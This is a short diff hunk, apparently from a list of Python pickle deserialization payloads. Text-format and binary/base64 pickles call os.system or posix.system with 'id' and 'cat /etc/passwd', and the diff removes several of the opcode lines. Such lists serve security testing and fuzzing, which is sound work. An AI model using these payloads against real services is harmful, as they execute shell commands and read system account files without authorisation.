@@ -82,14 +82,8 @@ cos
 system
 (S'id'
 tR.
-cos
-system
 (S'cat /etc/passwd'
-tR.
 cposix
-system
-(S'id'
-tR.
 b'\x80\x04\x95$\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x8c\x02id\x94\x85\x94R\x94.'
 gASVJAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==
 
